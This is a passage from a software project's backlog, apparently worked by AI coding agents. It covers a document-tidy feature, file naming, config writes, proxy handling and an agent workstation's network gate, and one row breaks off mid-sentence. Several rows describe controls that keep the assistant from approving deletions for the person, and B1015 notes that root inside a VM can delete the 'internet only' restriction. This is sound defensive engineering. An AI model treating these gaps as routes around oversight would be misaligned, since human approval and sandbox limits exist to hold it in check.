now write the person's answer as the chat route stores it, seal included; and the five test doubles of `add_user_message` (`test_chat_helpers.py` ×2, `test_kv_cache_invalidation_2927.py`, `test_review_regressions.py`, `test_a_default_is_about_absence.py`) take the new `from_person` keyword — they raised `TypeError` on it (9 cases red, measured).

- [x] **B1006** **Owner decision: the seeded "Documents Tidy" task hard-deletes documents every fifth new document, unasked.** — found by `docs-more` **Owner's call 2026-10-01 (`D-2026-10-01-03`): propose, don't delete** — **done 2026-10-01 (agent `w5-docs`, `8d091ed`), on `B1005`.** **It asks through `P21-02`'s plan, not beside it (`Law 14`).** `run_document_tidy` (the scheduled action's body) reads the same verdicts — `tidy_reasons`, which the agent's `_tidy` now reads too, with the duplicate's reason said once (`Law 7`) — over the owner's *live* documents, runs them as one `delete` step inside a transaction, reads the change list and rolls back (`document_folders.run_steps`), and holds it as a plan sealed to each document's content (`B994`'s digest), at most 100 with "the next tidy offers the rest" said. **Where it waits**: a plan lives in a chat, because that is where its answer is read, so the owner gets one "Documents Tidy" chat in Tasks (a fixed id per owner) that keeps the record — what was proposed, the person's answer, what happened. It waits a week (`propose_plan(ttl_seconds=…)`; the agent's waits 30 minutes because the person is in the chat that asked) and the next tidy replaces it. **The notification the person opens**: the scheduler's own queue (`add_notification(review=…)` — the list rides along), sent whatever the seeded task's quiet switch says, because the proposal *is* the delivery (seeded housekeeping is `notifications_enabled=False` and success never toasts for actions, so honouring either would make the owner's call invisible). In the browser `static/js/documentPlanNotice.js` (loaded by `tasks.js` the first time one arrives) shows a notice with **Review** — and the system notification when allowed — and Review opens the list, title and reason per document, in the shared confirm dialog (`P9-10`'s `details`): **Delete** / **Keep** / **Not now** (Esc). Not now leaves it waiting, and a reload offers it again (`GET /api/document-folders/plans`). **The apply path**: `POST /api/document-folders/plans/{id}/answer` refuses anything that is not a person (`request_is_a_person`: no bearer token, no `app_api` loopback — 403), finds only the caller's own *scheduled* proposal (an agent's plan is answered on the card in the chat that asked, and is not found here), records the answer in the plan's chat sealed as the person's (`B1005`), and applies through `apply_plan`, which reads it back from there and re-runs the steps — so a list that changed after it was shown (a document typed into) is refused and nothing is deleted. The delete is the library's own (`is_active` false), the open-document pointer is cleared after it (`forget_deleted`). **An owner-less task** is a skipped run — "Documents Tidy has no owner, so it judged no one's documents" — and touches nothing; it used to judge every owner's documents. A tidy with nothing to propose is the skipped run it always was, with no notice and no chat. The run's own sentence is past tense so it stays true after the answer: "Asked you about deleting 4 of 7: …. This run deleted nothing." The action's description reads "Propose removing junk, empty and duplicate documents — nothing is deleted until you apply it". Screenshots (dark, light, 360px and 390px, and the notice): the first labels ("Delete 100 documents", "Keep them") wrapped out of their buttons at 360px, measured — they are one word each now, and the question above them carries the count. `Verify:` `tests/test_the_documents_tidy_asks_first.py` — **22 cases**, on a real SQLite database: the task `ensure_defaults` seeds, run by the real scheduler (`_execute_task_locked`) — a plan, a notification carrying the list with each reason, the record in the owner's Tasks chat, every document where it was; only the owner's live documents judged; the notice the owner's alone; through the real answer route: Delete deletes exactly the list (soft, the open document no longer open, the person's answer sealed in the chat), Keep deletes nothing and ends it, Not now leaves it waiting and listed, a bad answer is no answer; the real `do_app_api`, a token and another person refused; a yes written into the tidy's chat not the person's; an agent's plan not answerable there; sealed to what was shown; a newer proposal replacing the older; waiting a week, not 30 minutes; the owner-less and nothing-to-do runs; and under node, the poller handing the proposal over instead of toasting it (`tests/harness/activity_row_status.js`'s notify mode now reports it), `documentPlanNotice.js` offering once and sending the label chosen (three answers), a refused answer said, a reload offering what waits, and `tasks.js`'s two loaders, cut out with `js_function`, loading the module. **On `4e65b71` the file cannot be collected** (`tidy_chat_id`, `answer_review` and the plan routes do not exist); **with the old `run_document_tidy` body put back in today's tree, 14 of 22 fail** — the 8 that pass are the six browser cases, an agent's plan not answerable from a notice, and the nothing-to-do skip (which the old code also raised). **Mutation: 23 on the first pass (16 server, 7 browser), 20 caught**; the three survivors — the proposal judging every owner, judging deleted rows, and the open document not forgotten after a delete — were closed by one new case (`test_only_the_owner_s_live_documents_are_judged`) and one new assertion, and re-run caught; two more were run after `tasks.js` came to load the module lazily (the poller's branch re-anchored, and the wrong module loaded), both caught: **25 of 25**. Per mutation: deleting at once (the plan committed) 9 of 20; the owner-less guard dropped 1; no notification 12; the notification without its list 11; no reasons 2; no chat record 2; the agent's 30 minutes 1; the route letting a token or the loopback through 2; another owner's proposal answerable 2; an agent's plan answerable 1; the answer unsealed 3; a refused apply reported as applied 1; a bad answer taken as a no 1; and in the browser, the poller announcing instead of offering 1, the wrong module loaded 1, offered twice 1, Keep sending the yes 1, Not now sending a no 1, a reload offering nothing 1, a refused answer toasted as done 1, the plan id not encoded 3; the re-runs 1 each. **Tests changed because the owner's call changed the behaviour they pinned**: `test_a_person_s_agent_keeps_their_own_documents.py::test_the_scheduled_tidy_still_runs_unattended_as_it_did` (it pinned the hard delete on purpose, `Law 1`) is now `test_the_scheduled_tidy_proposes_and_deletes_nothing`, and `test_document_tidy_null_timestamp.py` counts the proposal instead of the copy the tidy used to remove (the crash it guards is unchanged).

- [x] **B1007** **A signed reply and an annotated PDF are named by `_slug`, which drops every letter that is not ASCII.** — found by `docs-mail` — **done 2026-10-01 (agent `w5-docs`, `cb87eee`).** The premise holds: `_slug` was the name of both, and on `4e65b71` it kept `[A-Za-z0-9._-]` and nothing else — `docs-mail` measured `Q3 Board Pack – final (v2)` → `Q3_Board_Pack_final_v2` and `схема договора` → `form` with the real function, so the reply went out as `…_signed.pdf` and the export downloaded as `…_annotated.pdf`, under Starlette's header. **One answer (`Law 7`).** `_slug` is now `routes/document/document_helpers._pdf_export_name(title, variant)` — `src/file_names.display_name` of the title, with `B1000`'s rule that a `/` in a title is part of it (kept as `_`, not read as a folder), a `.pdf` the title already ends in not doubled, and a long title cut *before* the suffix so a 300-character title still says it was signed. **The suffix, the row's small product call**: ` (signed).pdf` and ` (annotated).pdf` — `Q3 Board Pack – final (v2) (signed).pdf`. The export is sent with `attachment_disposition` (always `attachment`, the name whole in `filename*`) instead of Starlette's header. The reply is staged through the mailbox's own `COMPOSE_UPLOADS_DIR`, `_new_compose_token` and `_remember_compose_name`, imported from `routes.email_helpers` at call time — as the same function already imported `_q` — rather than moved under `src/` as the row suggested: at call time every routes module is loaded, so there is no cycle, and moving them would have touched the email tests that patch `email_helpers.COMPOSE_UPLOADS_DIR` for nothing. The route's re-derived compose directory, and the `MAIL_ATTACHMENTS_DIR` and `uuid` imports only it used, are gone. So a title that cannot be stored as given (`Minutes: what we agreed?`) is stored `Minutes_ what we agreed_ (signed).pdf` and still sent under the title. `FORBIDDEN.md` Part 2: both downloads stay `attachment`. `Verify:` `tests/test_a_signed_form_keeps_its_name.py` — **11 cases**, through the real document router over `P21-03`'s harness (a real upload store, a real SQLite file): the row's `Verify:` for both titles through `GET …/export-pdf` (the header, and `filename*` decoding to the name) and `POST …/prepare-signed-reply` (the staged token, and the attachment the mailbox's own `_attach_compose_uploads` builds, read back by a mail parser), the kept name, and six naming rules (empty, none, `.pdf` in the title, a slash, a bidi override, 300 characters). The one stand-in is the form filler: `src/pdf_forms.fill_fields` needs PyMuPDF, an optional dependency this environment does not carry, so it copies the PDF through. **On `4e65b71` the file cannot be collected** (`_pdf_export_name` does not exist); **with the old naming put back in today's tree (non-ASCII letters dropped, Starlette's header, no kept name), 5 of 11 fail** — the 6 that pass are the helper's own rules on ASCII titles. **Mutation: 7 of 7 caught**: the export named by Starlette again 2; non-ASCII letters dropped (the old `_slug`) 5; the reply's kept name never written 1; the reply staged under the raw name 1; a slash read as a folder 1; a long title losing its suffix 1; a `.pdf` title doubled 1.

- [x] **B1008** **`migrate_from_settings` writes `settings.json` through a fourth door, and not atomically.** — found by `docs-mail` — **done 2026-10-01 (agent `w5-docs`, `77d0553`). Driven on `4e65b71`, not read**: a crash in the middle of the write left the file that holds every credential half-written; an unrelated save afterwards put both keys back from `src.settings`' cache (`B988`'s lost update, at boot); and a redirected `src.settings` did not take it along — it read its own `SETTINGS_FILE` import. **The fix**: `src.settings.load_settings` to read and `save_settings` to write — atomic, `P3-16`'s refusal to replace an unreadable file, the cache invalidated. An unreadable settings.json reads as the defaults, which carry neither key, so it is left exactly as it was. **The checker, widened.** `.pantheon/check-config-writes.py` classified only `atomic_write_*` calls, so this site was outside its measurement. It now also finds `open(<target>, <a mode that writes>)` and `<target>.write_text` / `.write_bytes` whose target — followed through the simple assignments in its function and its module (`settings_path = SETTINGS_FILE`, `DATA_FILE = INTEGRATIONS_FILE`) — names a guarded store by the constant it is imported as (`GUARDED_NAMES`) or by its file name (`GUARDED_BASENAMES`), and fails on one: a guarded store has one writer, the classified site. **Widening it found two more**, filed rather than fixed (`B1017` below) and listed in `KNOWN_PLAIN_WRITES` with why — a new one fails, and an entry whose write is gone fails, as a stale `STORES` entry does: the boot migration of user_prefs.json in `core/database.py` and the installer's first admin in `setup.py`. Measured: **write sites 40 · guarded 10 · strict-read 21 · rebuildable 9 · plain onto guarded 2 (known 2) · PROBLEMS 0**. `Verify:` `tests/test_the_miniflux_migration_uses_the_one_door.py` — **12 cases**: the migration against `src.settings` on a temp file — the row's `Verify:` (the two keys moved, every other key kept), the lost update, a crash mid-write leaving the file byte-for-byte, an unreadable file left as it was, nothing to move writing nothing, and a redirected loader and saver taking both halves with them; and the real checker on `test_a_failed_read_never_becomes_a_write.py`'s mirror of the tree (so nothing writes into the repository it measures): the old door named, three other spellings (`Path(…).write_text`, a file name joined to `DATA_DIR`, an append), a read not counted, and the acknowledgements kept honest both ways. **9 of 12 fail on `4e65b71`** (the 3 that pass: an unreadable file, nothing to move, a read is not a write). **Mutation: 9 run, 8 caught on the first pass**: the old door 2 (of the five migration cases); plain writes not looked for 6; an alias not followed 2; `write_text` not seen 1; a file name not seen 1; a read counted 1; a stale acknowledgement not reported 1; an acknowledged write never a problem 2. The survivor — reading the raw file instead of `load_settings` — was closed by `test_both_halves_go_through_the_one_door`, and re-run caught: **9 of 9**.

- [x] **B1009** **Owner question: `D-2026-09-10-01`'s reopen clause has fired on the owner's own machine.** *"What would reopen this. A deployment where the container genuinely can reach the LAN"* — measured 2026-10-01 on Docker Desktop 29.7.2 for Windows, Pantheon's own container reaches `192.168.1.1:80`/`:443` and the host's `:445` (`B975`). The network agent stays useful for what a bridged container never sees (the host's neighbour table and addresses, discovery, `host_shell`). Options: (a) accept that Pantheon's own container reaches the LAN, as `THREAT_MODEL.md` Known Gap 1 now says; (b) hold Pantheon's own container to a mode the way the workstation is held (`P20-06`'s gate pattern — a new row); (c) other. `Verify:` the owner's answer recorded in `D-2026-09-10-01`. — found by `B975` — agent:`P20` **Answered 2026-10-01 (`D-2026-10-01-03`): accept it and say it.** — agent:`integrator`

- [x] **B1010** **The prompt's own example for `get_workspace` is a call the parser does not read.** `agent_loop.TOOL_SECTIONS["get_workspace"]` teaches 

- [x] **B1011** **A UDP send refused by the workstation's network mode is not explained.** `B977`'s sentence reads TCP refusals (*No route to host*, *Couldn't connect to server*) and unresolved names; a UDP send the gate refuses fails with EPERM, *Operation not permitted* (measured 2026-10-01 in the image), which a file permission error also says, so it is not read as one. Under *internet* DNS to a LAN resolver is let through, so the common case is covered; SNMP, mDNS or a UDP probe to a LAN host is not. Fix: a sentence for EPERM when the output also shows a socket send (Python's `sendto` in the traceback line, `nc -u`), or count the gate's rejects around the call. `Verify:` under *internet*, a routed `python` doing `sendto(('192.168.1.1', 161))` carries the sentence. — found by `B977` — agent:`P20` — **done 2026-10-01 (agent `w5-net`, `ddac1bc`). Measured first, under the gate's real rules (`netrules.ruleset` loaded with nft into a fresh network namespace with a tun default route — no Docker; kernel 6.18, Python 3.11, bash 5.2, OpenBSD netcat 1.226, Ubuntu's): Python quotes the send — `s.sendto(b'x', ('192.168.1.1', 161))` — above a bare `PermissionError: [Errno 1] Operation not permitted`, and a file operation's EPERM always ends with the file's name (`os.chown`: `…not permitted: '/path'`); `n = 1 + s.sendto(…)` adds 3.11's `^^^^` line under it; mDNS's `224.0.0.251` is refused alike; bash's `echo hi > /dev/udp/192.168.1.1/161` prints `bash: line 1: echo: write error: Operation not permitted` — word for word a refused file write; and `nc -u` (with or without `-v`) prints nothing and exits 0.** So `network_refusal_note` (the routed result's `note`, `B977`'s one function) reads a send where the output tells it apart from a file error — a Python traceback whose quoted line is a send (`sendto`/`send`/`sendall`/`sendmsg`) and whose error names no file; bash's write error when **the command** itself writes to `/dev/udp/` (the routed call now passes its command; the address is the command's) — and says, under *internet*: *"192.168.1.1 is a private address, and this workstation's network mode is internet only (an admin's setting): it refuses every send to your local network, multicast and every other private address at once. Here that shows as "Operation not permitted" — the setting, not a file permission or a fault to debug. Ask an admin if the work needs it."* (*a multicast address* for `224/4`), the conditional form when the send names no address, nothing when it named only public ones (never the gate's), and under *none* the none sentence. A named refused address beats a sentence that can only say "if", whichever kind of refusal names it. **Not explained, and why (precisely): `nc -u` — silent, exit 0, nothing in its result shows a refusal (filed).** `Verify:` `tests/test_a_refused_send_says_the_network_mode_refused_it.py` — **26 cases**: the sentence from each measured output; six EPERMs that are not a send (`chown`, `kill`, a `send`-named call whose error names a file, a refused file write, a bare EPERM, `nc -u`'s silence) say nothing in either mode; a public send was somebody else's; the real dispatcher against the real daemon and a real gate holding the mode (`B977`'s `RunningGate`) — a routed `python` carrying the measured `sendto` traceback (**the row's `Verify:`**), a routed bash `/dev/udp` write, *none*, a file error carrying nothing; **the real agent loop** — the model's `python` block runs routed and its next round is sent the sentence; and **the real programs under the real *internet* and *none* rules in a fresh network namespace** (runs where root, `unshare`, `nft` and `/dev/net/tun` are there — here it ran; skips elsewhere). **16 of 26 fail on the old code in substance; 9 guards error there only because the old function took no `command`; 1 green (a file error carries nothing).** **Mutation: 12 of 12 caught** (the command not passed: 1 of 26; a file's EPERM read as a send: 1; any quoted line taken for a send: 1; bash's write error read without `/dev/udp`: 1; a public send explained: 1; multicast called private: 2; *none* ignoring sends: 5; the traceback's address not read: 8; the bash address not read: 5; 3.11's carets taken for the quoted line: 2; a send not read once a connection was refused: 2; the conditional before a send that names its address: 1). `B977`'s 32 (+2 opt-in) unchanged. — agent:`w5-net`

- [x] **B1012** **`host_shell`'s description says `bash` cannot reach the host's services.** `tool_schemas.py` and `tool_index.py`: *"its filesystem, its services, its network stack. `bash` cannot reach any of that, because it runs inside the container."* Measured 2026-10-01 on Docker Desktop 29.7.2 (`B975`), a container reaches the host's LAN-facing services (`192.168.1.71:445` open). Its filesystem, processes, loopback-only services and network stack are still out of reach. Fix: say which — *the host's files, processes and its own network configuration, and services listening only on its loopback*. `Verify:` the description names nothing a bridged container reaches on Docker Desktop. — found by `B975` — agent:`P17` — **done 2026-10-01 (agent `w5-net`, `d4cd09e`). Every place a model reads it — the native schema (`tool_schemas.py`) and the tool index (`tool_index.py`); `TOOL_SECTIONS` has no `host_shell` section, and the Settings cards make no such claim — now names what a bridged container never reaches: the host's files beyond what is mounted into the container, its processes and services (list, start, stop), its own network configuration (addresses, routes, neighbour table); and says a connection over the network is something `bash` can often make itself (*"on Docker Desktop a container reaches the host and the LAN"*).** **One clause of the row's suggested text was left out (`Law 3`/`Law 10`): *"services listening only on its loopback"*.** Whether a service bound only to the host's `127.0.0.1` answers `host.docker.internal` on Docker Desktop is not measured anywhere in the repo — `netagent/install.py`, `netagent/server.py`, `docs/setup.md` and `.env.example` all assert that it does not, with no measurement cited, and reports of Docker Desktop's behaviour differ (not measured here) — so the description claims it neither way, and the `Verify:` holds whichever answer is true (filed below). `Verify:` `tests/test_host_shell_says_what_bash_cannot_do.py` — **7 cases**, over every description a model reads (a fenced section too, if one is ever added): no sentence says `bash` *cannot reach*, no *"network stack"*; each names files beyond the mounts, processes and network configuration; each leaves a connection over the network to `bash`, naming Docker Desktop. **6 of 7 fail on the old descriptions** (the guard that both places are found passes). **Mutation: 4 of 4 caught** (the schema's old sentence: 3 of 7; the index's: 3; the index forgetting `bash` can connect: 1; the schema saying *cannot reach* again: 1). — agent:`w5-net`

- [x] **B1013** **An IPv6 range in `NO_PROXY` makes every httpx client raise.** Found by `B982` 2026-10-01, measured with httpx 0.28.1: with `NO_PROXY=localhost,fd00::/8` (and `no_proxy` unset or the same), `httpx.Client()` and `httpx.AsyncClient()` raise `InvalidURL: Invalid port: ':'` at construction — `get_environment_proxies` turns `fd00::/8` into the pattern `all://[fd00::/8]`, which its own URL parser refuses — whether or not a proxy is set. Every Pantheon call that builds an httpx client trusting the environment then fails, model calls included. Fix: read `NO_PROXY` once at start (`src.paced_http.no_proxy_ranges` already parses ranges) and keep IPv6 ranges away from httpx's reader — a client built with `trust_env=False` and the environment's proxies passed as `mounts`, or the offending entries dropped from what httpx sees with a log line — and say it at start. `Verify:` with that environment a model call and a workstation call succeed, and `fd00::5` is still direct. `Depends:` `B982`. — found by `B982` — agent:`P16` — **done 2026-10-01 (agent `w5-net`, `37ce408`). Re-measured (`Law 3`): true, and the sandbox it was measured in shows why it hid — its `NO_PROXY` holds `::1` and `::`, single IPv6 addresses httpx reads (`all://[::1]`), and its clients build.** The second of the row's shapes, at the one place every client reads: `paced_http.guard_environment_reader()` puts `readable_environment_proxies` where httpx reads the environment (`httpx._client.get_environment_proxies`, once; httpx is pinned at 0.28.1 and a different httpx without that name gets a warning, not a silent guard). It keeps every proxy and every entry httpx can parse and leaves out only a no-proxy entry httpx's own `URLPattern` refuses — said once, by name, in the log at start (*"NO_PROXY holds fd00::/8, which httpx cannot read (an IPv6 range): kept from httpx so its clients can be built (B1013). Where Pantheon reads NO_PROXY ranges itself (paced_http.direct_mounts) an address in it still goes direct; a command in a shell reads NO_PROXY as it is."*). Called by `app.py` right after logging is set up, before any route module is imported, and by the image MCP server (its own process). Chosen over `trust_env=False` because that also stops httpx reading `SSL_CERT_FILE`/`SSL_CERT_DIR` (read in httpx 0.28.1's `_config.py`), and because one place covers clients Pantheon does not construct itself (`httpx.get`, the MCP SDK's). **Nothing the operator wrote is dropped**: the environment is untouched (curl in the agent's shell still reads the range), and `no_proxy_ranges` reads `urllib`, not httpx, so `direct_mounts` still sends `fd00::5` direct; what httpx loses is a pattern it could never match (it reads no range, `B982`). `Verify:` `tests/test_an_ipv6_range_in_no_proxy_breaks_no_client.py` — **10 cases**: the premise (`Client`, `AsyncClient`, `httpx.get` raise); this sandbox's own `NO_PROXY` builds; after start every client builds and keeps the proxies and `all://localhost`; **a real model call (`llm_call_async`) and a real workstation call (the real daemon) succeed with a recording proxy hearing nothing**; `fd00::5` direct (the connection fails here without IPv6 and the proxy hears nothing) and its control (left to the environment, the proxy is handed it — as `CONNECT fd00::5:7040`, measured: httpcore writes an IPv6 authority without brackets, filed); said once and the environment untouched; nothing kept from httpx that it can read; **a fresh process importing the app, and one loading the image server, builds its clients** with that environment. **8 of 10 fail on the old code** (the premise and the sandbox control pass). **Mutation: 9 of 9 caught** (never installed: 7 of 10; an unreadable entry kept: 7; every no-proxy entry dropped: 5; the proxies dropped: 4; the app not installing it: 1; the image server not: 1; not said: 3; said every time: 1; `no_proxy_ranges` reading through httpx's view: 2). — agent:`w5-net`

- [x] **B1014** **httpx clients built outside `paced_http` still ignore a range in `NO_PROXY`.** Found by `B982` 2026-10-01: `direct_mounts` is used by `paced_http`'s own clients and the workstation client; 58 `httpx.Client(`/`httpx.AsyncClient(` constructions in 22 files under `src/`, `routes/`, `core/` and `app.py` build their own and read `NO_PROXY` as httpx does (names and single addresses only). Fix: route those through `paced_http` (the limiter wants them anyway, `P15-06`) or pass `mounts=paced_http.direct_mounts(url)` where a client is made for one destination. `Verify:` a scan of client constructions finds none without it, or a ratchet like `check-outbound.py`'s. `Depends:` `B982`. — found by `B982` — agent:`P16` — **done 2026-10-01 (agent `w5-net`, `262fb97`). Re-counted (`Law 6`): 58 in 22 files over the row's roots, as it said; over `check-outbound.py`'s roots (with `services/` and `mcp_servers/`) 60, of which four pass `transport=` (the SSRF-pinned webhook, `web_fetch`, `api_call` and skill-import clients) and CalDAV's passes `trust_env=False` — httpx reads no environment proxy for those at all — so 55 to route.** Every one now says `mounts=paced_http.direct_mounts(url)`: **Pantheon's own API on loopback** (the cookbook tools ×25, the serve lifecycle, task routes, `app_api`, contacts, research, the scheduled serve) routed and **not paced** — they are not outbound, and the limiter's network-scope check (`networks.require_host`) would refuse Pantheon's own `127.0.0.1` inside a scoped run; **the model client** (`llm_core`) one shared client as before plus one per host a range sends direct (`_client_for`), so a LAN model server behind an operator's proxy is reached and stays warm; **image, gallery, embedding, warmup, model-list and image-MCP clients** routed, their pacing left in `check-outbound`'s named inventory (`P15-06`'s budget, which this row lowers only by what it paced); **six third-party sends now go through `paced_http` as well**, so the limiter sees them — the ntfy and Discord *Test* buttons, a reminder's webhook and ntfy, Google's MCP token exchange, Miniflux (`otlp_export` was already paced). **`check-outbound.py` now fails, with no budget, on a construction that says nothing** (no `mounts=`, `transport=` or `trust_env=False`), **counts the 51 module-level `httpx.get`/`post`/… calls** (which build a client nothing can say that to) against a new `--max-env`, and **counts only `paced_http`'s request calls as pacing** — before, a function that merely imported the module was paced, so routing a client with `direct_mounts` would have shrunk the inventory by a call nobody paced (`Law 10`). Its unpaced count is now **110** (116 less the six); `ci.yml` keeps `--max 116` because the ledger's `fan-out` claim repeats it — the three move together, by the integrator. `Verify:` `tests/test_every_client_honours_a_range_in_no_proxy.py` — **19 cases**, a recording proxy and servers on `127.0.0.2` (in `127.0.0.0/8`, never named): **a real model call, a cookbook tool, the embedding client, a reminder's ntfy and both *Test* buttons reached direct — and paced where they should be — each with its control** (no range: the proxy is handed it); the shared model client; **the checker on the tree (none unsaid, both CI budgets hold)** and on files written for it (six construction forms; the module-level budget; routing is not pacing). **13 of 19 fail on the old code** (the three controls and the three forms the old checker had no rule for pass). **Mutation: 13 of 13 caught** after one round (the first caught 11 of 12; the survivor — the Discord test reverted to an unpaced `post` — hid because `check-outbound` counts a function paced when any call in it is, filed; the *Test*-button case closes it). Targeted existing files touching what changed: **796 passed** (42 files). — agent:`w5-net`

- [ ] **B1015** **On the VM backend *internet only* holds only while sudo is off.** Found by `B992` 2026-10-01. *None* is held by QEMU (`restrict=on`); *internet* is held inside each machine for accounts, and root there deletes it. A gate in front of the VM host would hold it against root but also holds the namespace the host makes the machine image in (Ubuntu's and Mozilla's repositories, on the first start). Fix: run each person's QEMU as a uid of its own and give the VM host `NET_ADMIN` for rules scoped to that uid range (`netrules.ruleset(uids=…)`, the accounts layer's shape) in its own namespace — root in a machine cannot reach the host, so the rules hold against it, and the image-maker (root) is not in the range; `health` then says `enforcement: hypervisor` for *internet* too. Measure the probes from a real machine. `Verify:` on the VM backend, *internet only* refuses a LAN probe from root in a machine. `Depends:` `B992`. — found by `B992` — agent:`P20`

- [x] **B1016** **A test's fake proxy kept answering `502` after it was closed — to the next test's workstation.** `tests/test_a_range_in_no_proxy_is_honoured.py`'s `Recorder` closed its listening socket from the main thread while its serving thread sat in `accept()`; on Linux that does not wake the call, and the thread stayed blocked on the fd number the process then reused for the next test's workstation daemon, so it accepted that daemon's connections and answered them `502` (*"The workstation answered 502."* on `config`, in `test_the_agent_reads_it_on_a_real_turn`, which ran next). Found at the follow-up merge by tracing the 502 to its socket. — agent:`integrator` — **done 2026-10-01.** `close()` shuts the socket down (which wakes `accept()`), closes it and joins the thread. `Verify:` that file then the refused-connection file: 14 passed (1 failed before).

- [ ] **B1017** **Two plain writes onto guarded config stores remain.** Found 2026-10-01 by `B1008`'s widening of `.pantheon/check-config-writes.py`, which now lists them in `KNOWN_PLAIN_WRITES` rather than failing on them. `core/database.py` (the boot migration of a flat `user_prefs.json` to the per-user form, ~line 2170) writes it with `open(prefs_path, "w")` + `json.dump`: its read raises on a bad file, so it is not the `P3-16` shape, but it is not atomic — a crash mid-write truncates the file holding every user's preferences. `setup.py` (`_create_initial_admin`, ~line 131) writes the first admin to `auth.json` the same way, only when no auth.json exists — nothing to lose, but a crash mid-write leaves a half-written file the installer then skips forever ("auth.json already exists") and the app cannot read. Fix: `atomic_write_json(…, preserve_unreadable=True)` at both (classify the new sites in `STORES`), then drop both `KNOWN_PLAIN_WRITES` entries — the checker fails until they are dropped. — found by `w5-docs`

- [ ] **B1018** **A waiting document plan lives in process memory, and the scheduled tidy's waits a week.** `document_folders._plans` is a dict, so a restart forgets every waiting plan. For the agent's 30-minute plans `P21-02` judged that acceptable (the agent is told none is waiting and the person asks again). `B1006`'s scheduled Documents Tidy proposal waits seven days for a person who may not open Pantheon for most of them: after a restart, Review says *"That tidy is no longer waiting"*, nothing is deleted (fail-closed), and nothing re-offers it until the tidy next runs (after five more new documents). Fix: hold plans in a table (owner, chat, steps, changes, review, created/expires), read by the same `pending_plan` / `waiting_review(s)`. — found by `w5-docs`

- [x] **B1019** **Owner decision: "Keep" is not remembered — the next Documents Tidy proposes the same documents again.** `B1006`'s Keep answer discards that proposal and deletes nothing; the rules are unchanged, so the next run (after five more new documents) offers the same "test" and "Untitled" again, every time, until the person deletes them or pauses the task. Before `B1006` the question never arose (the tidy deleted). Options: remember a kept document (`Document.tidy_verdict` already exists, written by the library's AI tidy, and could say "kept"); remember the kept set on the task; or leave it — the person can pause Documents Tidy in Tasks. — found by `w5-docs` **Owner's call 2026-10-01 (`D-2026-10-01-04`): remember Keep** — a kept document is marked kept and not proposed again unless it changes. — **done 2026-10-01 (agent `w6-calls`, `7c32fed`).** **Measured first** (`Law 3`): on `ed6f736`, Keep on a proposal of four wrote nothing, and the next run *"Asked you about deleting 4 of 7"* — the same four. **The mark**: `Document.tidy_verdict` reused — the column the library's AI tidy keeps its verdicts in (`keep`, or `junk` on a row it then deletes; it skips any row with a verdict) — with a value it never writes, `kept:<digest>`. **"Changes" means the content, by digest**: the digest `B994` already seals a plan to (`document_content_digest`, on each `deleted` change), of what the person was shown. Not `updated_at`: filing never moves it (`document_folders._refile`) while a rename and the AI tidy's own verdict write both do (measured, `B1035`), so it would re-propose a document because a model looked at it, and keep one the person has since emptied. So a kept document typed into is judged afresh; a rename or a move is not a change (the person kept that document); one typed into between the notice and the Keep was kept as shown and is judged again; one deleted meanwhile is not marked. The mark is written back with the document's own `updated_at` (`_refile`'s UPDATE), so keeping is not reported as editing. **Read once (`Law 7`)**: `tidy_reasons`, both tidies' one reading of the rules, leaves out a document whose mark still matches — after the rules run, so its duplicate is still a duplicate and the kept copy is the one that stays — and hands the caller the ids it left out, so the scheduled run says it (*"scanned 7 document(s), no junk (4 documents you chose to keep were left alone)"*, and in the tidy chat's record) and so does the agent's `manage_documents tidy` (*"…the only ones that look like clutter are the 4 you chose to keep when Documents Tidy asked"*, or *"4 you chose to keep … are left out"* on its plan). Keep's toast and the chat record say *"Kept 4 documents. Documents Tidy won't ask about them again unless they change."* **The library's AI tidy**: it skips any document with a verdict, so a kept document is never sent to a model that deletes on "junk"; and its own `keep` is not read as the person's — a model's guess from the document's own text must not hide it from the rules (`B1005`'s point), and neither does a mark for content the document no longer has. A stale mark keeps the AI tidy away from that document, as its own `keep` always has (it never re-reviews). **Unforgeable (`B1005`)**: `remember_kept` runs only from `answer_review`, behind the route only a person can call (`request_is_a_person`), only for Keep, and marks nothing unless `plan_answer` — the sealed reading that guards the delete — says the person declined; the assistant through `app_api` and a bearer token are refused (403) and mark nothing, and a "Don't change anything" written into the tidy chat by anyone but the person marks nothing. Only the scheduled proposal's Keep marks: the agent's own plan card answers "Don't change anything", which declines that plan rather than keeping its documents. No static file changed (the toast prints the route's message). `Verify:` let Documents Tidy propose and choose **Keep** — the toast says the four are kept; add five documents so it runs again — it asks about none of them, and the run row says they were left alone; type into one of the four, and the next run asks about that one only. `CI:` `tests/test_a_kept_document_stays_kept.py` — **14 cases** on `B1006`'s harness (a real SQLite database, the task `ensure_defaults` seeds run by the real scheduler, the real answer route, the real `do_app_api`, the real agent tool, the library's real AI-tidy route with only the model's reply faked): Keep marks exactly what was shown and says so, every `updated_at` unchanged; the next tidy asks about none and says why; new clutter asked about and kept clutter not; typed into → asked again; what is kept is what was shown, and a document deleted since is not marked; a rename or a move is not a change; Delete, a bad answer and Not now mark nothing; only Keep marks (`answer_review` given another "no"); `app_api`, a token, and a decline written into the tidy chat mark nothing; the AI's `keep` and a stale mark are not the person's; the agent's tidy leaves kept documents out and says so; the AI tidy never judges a kept document. **9 fail on the old tree** (one because `remember_kept` is new; the 5 that pass are the "marks nothing" guards). **Mutation: 13 run, 12 caught on the first pass** (of 35, with `B1006`'s 22 cases); the survivor — `remember_kept` called for any non-yes answer — is unreachable through the route (it takes two labels) and was closed by `test_only_keep_marks_anything`, re-run caught: **13 of 13**. Per mutation: Keep not remembered (the old answer) 8; a kept document not left out 6; any kept mark honoured whatever the content 3; the AI tidy's `keep` read as the person's 1; the person's sealed answer not read 1; the route's answer not checked 1 (re-run, of 36); keeping recorded as editing 7; marked as it is now, not as shown 1; a document deleted since marked 1; the skipped run not saying what it left alone 2; the proposal's record not saying it 2; the agent's tidy not saying it 1; the reply not saying Keep is remembered 2. — agent:`w6-calls`

